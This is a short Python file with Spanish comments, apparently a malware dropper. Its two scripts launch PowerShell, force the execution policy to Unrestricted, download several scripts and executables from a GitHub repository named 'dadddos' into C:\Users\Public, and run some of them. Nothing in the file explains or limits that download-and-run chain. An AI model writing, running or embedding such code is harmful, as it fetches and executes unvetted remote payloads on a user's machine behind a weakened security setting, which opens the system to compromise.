import subprocess

# Comando para cambiar la Execution Policy
change_execution_policy = 'Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process -Force -Confirm:$false'

# Comando para descargar el script desde GitHub y ejecutarlo
download_and_execute_command = (
    'Invoke-WebRequest -Uri https://raw.githubusercontent.com/fullcaleta/dadddos/main/poli.ps1 '
    '-OutFile C:\\Users\\Public\\poli.ps1 ; & "C:\\Users\\Public\\poli.ps1"'
)

try:
    process = subprocess.Popen(['powershell.exe', '-Command', change_execution_policy, ';', download_and_execute_command],
                               stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True)

    output, error = process.communicate()

    if output:
        print(f"Output: {output}")
    if error:
        print(f"Error: {error}")

except subprocess.CalledProcessError as e:
    print(f"Error occurred: {e}")



import subprocess

# Comando para cambiar la Execution Policy
change_execution_policy = 'Set-ExecutionPolicy Unrestricted -Scope Process -Force'

# Lista de comandos para descargar archivos y ejecutarlos
commands = [
    'Set-ExecutionPolicy Unrestricted -Scope Process -Force',
    'Invoke-WebRequest -Uri https://raw.githubusercontent.com/fullcaleta/dadddos/main/MainWinStyle.ps1 -OutFile C:\\Users\\Public\\MainWinStyle.ps1',
    'Invoke-WebRequest -Uri https://raw.githubusercontent.com/fullcaleta/dadddos/main/poli.exe -OutFile C:\\Users\\Public\\poli.exe',
    'Invoke-WebRequest -Uri https://raw.githubusercontent.com/fullcaleta/dadddos/main/RNM.exe -OutFile C:\\Users\\Public\\RNM.exe',
    'Set-ExecutionPolicy Unrestricted -Scope Process -Force; Invoke-WebRequest -Uri https://raw.githubusercontent.com/fullcaleta/dadddos/main/tasl.ps1 -OutFile C:\\Users\\Public\\tasl.ps1',
    'C:\\Users\\Public\\tasl.ps1',
    'Invoke-WebRequest -Uri https://raw.githubusercontent.com/fullcaleta/dadddos/main/dlhsty.ps1 -OutFile C:\\Users\\Public\\dlhsty.ps1',
    'C:\\Users\\Public\\dlhsty.ps1'
]

try:
    process = subprocess.Popen(['powershell'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True)

    # Cambiar la Execution Policy
    process.stdin.write(change_execution_policy + '\n')

    # Ejecutar los comandos para descargar y ejecutar los archivos
    for command in commands:
        process.stdin.write(command + '\n')

    process.stdin.close()

    output, error = process.communicate()
    if output:
        print(f"Output: {output}")
    if error:
        print(f"Error: {error}")

except subprocess.CalledProcessError as e:
    print(f"Error occurred: {e}")
